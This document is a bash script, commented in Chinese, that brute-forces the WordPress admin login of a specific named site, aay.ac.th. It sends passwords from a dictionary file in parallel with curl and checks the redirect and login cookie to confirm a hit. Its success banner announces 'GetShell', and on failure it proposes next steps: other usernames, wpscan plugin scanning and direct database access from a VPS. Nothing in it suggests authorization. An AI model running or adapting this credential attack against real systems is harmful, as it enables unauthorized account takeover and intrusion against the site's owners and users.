#!/bin/bash
TARGET="https://aay.ac.th"
USER="admin"
DICT="smart_passwords.txt"
TOTAL=$(wc -l < $DICT)
PARALLEL=10  # 并发数

echo "╔════════════════════════════════════════════════════════╗"
echo "║     并发精确爆破 - aay.ac.th                          ║"
echo "╚════════════════════════════════════════════════════════╝"
echo "[+] 目标: $TARGET"
echo "[+] 用户: $USER"
echo "[+] 字典: $TOTAL 个密码"
echo "[+] 并发: $PARALLEL"
echo "[+] 开始: $(date '+%H:%M:%S')"
echo

test_password() {
    local pass="$1"
    local num="$2"
    
    # 获取初始cookie
    curl -sk "$TARGET/wp-login.php" -c /tmp/wp_${num}.txt -o /dev/null 2>&1
    
    # 提交登录
    RESPONSE=$(curl -sk "$TARGET/wp-login.php" \
        -X POST \
        -b /tmp/wp_${num}.txt \
        -c /tmp/wp_result_${num}.txt \
        -d "log=$USER&pwd=$pass&wp-submit=Log+In&testcookie=1" \
        -D /tmp/wp_headers_${num}.txt \
        -o /tmp/wp_body_${num}.html \
        -w "%{http_code}" \
        2>&1)
    
    # 4重验证
    if [ "$RESPONSE" = "302" ]; then
        if grep -qi "Location:.*wp-admin" /tmp/wp_headers_${num}.txt 2>/dev/null; then
            if grep -qi "wordpress_logged_in" /tmp/wp_result_${num}.txt 2>/dev/null; then
                if ! grep -qi "login_error" /tmp/wp_body_${num}.html 2>/dev/null; then
                    echo "SUCCESS:$pass" >> /tmp/wp_success.txt
                    echo "✅ 成功: $pass"
                    pkill -P $$ curl
                    exit 0
                fi
            fi
        fi
    fi
    
    # 清理
    rm -f /tmp/wp_${num}.txt /tmp/wp_result_${num}.txt /tmp/wp_headers_${num}.txt /tmp/wp_body_${num}.html
}

export -f test_password
export TARGET USER

# 清理旧结果
rm -f /tmp/wp_success.txt

# 并发测试
cat $DICT | head -200 | nl | xargs -P $PARALLEL -I {} bash -c '
    arr=({})
    num=${arr[0]}
    pass="${arr[1]}"
    test_password "$pass" "$num"
    [ $((num % 20)) -eq 0 ] && echo "[进度] $num/200"
    sleep 0.5
'

if [ -f /tmp/wp_success.txt ]; then
    echo
    echo "╔════════════════════════════════════════════════════════╗"
    echo "║           🎯 GetShell 成功！                          ║"
    echo "╚════════════════════════════════════════════════════════╝"
    cat /tmp/wp_success.txt
else
    echo
    echo "❌ 前200个密码测试完成，未找到有效密码"
    echo
    echo "建议下一步:"
    echo "1. 测试其他用户名: aay-editor"
    echo "2. wpscan扫描插件漏洞"
    echo "3. 从VPS测试数据库直连"
fi
